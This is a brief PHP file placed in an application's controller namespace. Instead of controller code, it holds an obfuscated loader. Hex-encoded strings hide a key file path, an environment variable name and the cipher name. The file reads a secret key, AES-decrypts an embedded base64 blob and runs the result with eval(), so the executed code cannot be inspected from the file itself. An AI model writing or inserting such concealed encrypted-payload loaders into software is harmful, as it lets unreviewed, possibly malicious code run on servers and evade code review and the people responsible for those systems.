<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('47/eVGIHRuRRVWbcdptaUg==');

$c=base64_decode(

'5nqNczdh1bJdEjAslxXPgqVP6ztk+up22dxhMRxZYFV17MPh5Z9C3MbGeoTZGLZDQeRUlgY16w2Q' .
'eye+6iT9RvGnpkeLiEuSEI5vkv0YvIjVUxHmgFmR1uJGRwAXxV5H/kZWGFn3gmdTN19F24z3adCB' .
'Wo2maziDOuEMBYZrm4PYHyFAKEN0hl6+FKKXS94Kuf7mGo5uzFHbKT7jG9di7hYe/EPGDKcuwy1i' .
'BX2NlpJsaIg1FqNddyXQLNYn9YoS'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

